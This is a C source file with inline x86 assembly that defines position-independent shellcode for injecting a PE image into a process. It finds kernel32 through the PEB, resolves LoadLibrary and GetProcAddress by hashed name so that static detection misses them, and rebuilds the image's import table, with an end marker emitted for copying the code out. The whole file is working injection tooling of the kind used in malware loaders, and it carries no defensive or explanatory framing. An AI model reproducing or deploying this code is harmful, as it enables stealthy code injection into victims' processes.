#define EMIT(_data_) __asm __emit _data_
#define _ __asm __emit 

#define h_LoadLibraryA    0xA412FD89 
#define h_GetProcAddress  0xF2509B84

#define h_LoadLibraryExA  0x04BF60E8

#define ENDM  'DNE~' 

/**
* Shellcode for setting up library imports
*/
__declspec(naked) ULONG __stdcall inj_shellcode(PVOID Addr)
{
    ULONG fLoadLibraryA, fGetProcAddress, bRet;

    __asm
    {
        push    ebp
        mov     ebp, esp
        sub     esp, __LOCAL_SIZE

        pushad

        call    _realloc

_realloc:

        // calculate shellcode address
        pop     ebx
        sub     ebx, _realloc        

        call    _get_kernel_32
        mov     esi, eax

        push    h_LoadLibraryExA
        push    esi
        call    _get_proc_addr

        // get address of KERNEL32.DLL
        push    0
        push    0
        lea     ecx, [ebx + _kernel32_name]
        push    ecx
        call    eax
        mov     esi, eax

        push    h_LoadLibraryA
        push    esi
        call    _get_proc_addr
        mov     fLoadLibraryA, eax 

        push    h_GetProcAddress
        push    esi
        call    _get_proc_addr
        mov     fGetProcAddress, eax

        push    fGetProcAddress
        push    fLoadLibraryA
        mov     eax, [ebp + 8]
        push    eax
        call    _process_imports
        mov     bRet, eax

        popad

        mov     eax, bRet

        mov     esp, ebp
        pop     ebp
        retn    0x04

_calc_hash:
        push    ebp
        mov     ebp, esp
        mov     eax, [ebp + 8]
        push    edx
        xor     edx, edx

_calc_hash_next:
        rol     edx, 3
        xor     dl, [eax]
        inc     eax
        cmp     [eax], 0
        jnz     _calc_hash_next
        mov     eax, edx
        pop     edx
        pop     ebp
        retn    4

_get_kernel_32:
        push    esi
        xor     eax, eax
        mov     eax, fs:[0x30]
        js      _find_kernel_9x
        mov     eax, [eax + 0x0c]
        mov     esi, [eax + 0x1c]
        lodsd
        mov     eax, [eax + 0x8]
        jmp     _find_kernel_end

_find_kernel_9x:
        mov     eax, [eax + 0x34]
        lea     eax, [eax + 0x7c]
        mov     eax, [eax + 0x3c]

_find_kernel_end:
        pop     esi
        ret

_get_proc_addr:
        push    ebp
        mov     ebp, esp
        push    ebx
        push    esi
        push    edi
        xor     eax, eax
        mov     ebx, [ebp + 0Ch]
        mov     esi, [ebp + 8]
        mov     edi, esi
        add     esi, [esi + 3Ch]
        mov     ecx, [esi + 78h]
        add     ecx, edi
        mov     edx, [ecx + 1ch]
        push    edx
        mov     edx, [ecx + 24h]
        push    edx
        mov     esi, [ecx + 20h]
        add     esi, edi
        cdq
        dec     edx

_next_func:     
        lodsd
        inc     edx
        add     eax, [ebp + 8]
        push    eax
        call    _calc_hash
        cmp     eax, ebx
        jnz     _next_func
        mov     eax, [ebp + 8]
        xchg    eax, edx
        pop     esi
        add     esi, edx
        shl     eax, 1
        add     eax, esi
        xor     ecx, ecx
        movzx   ecx, word ptr [eax]
        pop     edi
        shl     ecx, 2
        add     ecx, edx
        add     ecx, edi
        mov     eax, [ecx]
        add     eax, edx
        pop     edi
        pop     esi
        pop     ebx
        pop     ebp
        retn    8

_process_imports:
        push    ebp
        mov     ebp, esp
        sub     esp, 0x10
        push    ebx
        mov     ebx, [ebp + 8]
        test    ebx, ebx
        push    esi
        push    edi
        je      _l067
        mov     eax, [ebx + 0x3c]
        mov     edi, [eax + ebx + 0x80]
        add     edi, ebx
        jmp     _l058
_l013:
        mov     eax, [edi + 0xc]
        add     eax, ebx
        mov     [ebp - 4], eax
        push    [ebp - 4]
        call    [ebp + 0x0c]
        mov     [ebp + 8], eax
        cmp     dword ptr [ebp + 8], 0
        je      _l067
        cmp     dword ptr [edi + 4], -1
        jnz     _l025
        mov     eax, [edi]
        jmp     _l026
_l025:
        mov     eax, [edi + 0x10]
_l026:
        mov     [ebp - 4], eax
        lea     esi,[eax + ebx]
        jmp     _l055
_l029:
        mov     eax, [esi]
        test    eax, 0xf0000000
        je      _l040
        and     eax, 0x0ffff
        mov     [ebp - 8], eax
        push    [ebp - 8]
        push    [ebp + 8]
        call    [ebp + 0x10]
        mov     [ebp - 0x0c], eax
        mov     eax, [ebp - 0x0c]
        jmp     _l047
_l040:
        lea     eax, [eax + ebx + 2]
        mov     [ebp - 8], eax
        push    [ebp - 8]
        push    [ebp + 8]
        call    [ebp + 0x10]
        mov     [ebp - 0x10], eax
        mov     eax, [ebp - 0x10]
_l047:
        test    eax, eax
        mov     [esi], eax
        je      _l067
        mov     eax, [edi + 0x10]
        sub     eax, [ebp - 4]
        mov     ecx, [esi]
        mov     [eax + esi], ecx
        add     esi, 4
_l055:
        cmp     dword ptr [esi], 0
        jnz     _l029
        add     edi, 0x14
_l058:
        cmp     dword ptr [edi], 0
        jnz     _l013
        xor     eax, eax
        inc     eax
_l062:
        pop     edi
        pop     esi
        pop     ebx
        leave
        retn    0x0c
_l067:
        xor     eax, eax
        jmp     _l062

_kernel32_name:

        EMIT('k' _ 'e' _ 'r' _ 'n' _ 'e' _ 'l' _ '3' _ '2' _ 0)
    }

    // shellcode's end marker
    EMIT('~' _ 'E' _ 'N' _ 'D') 
}
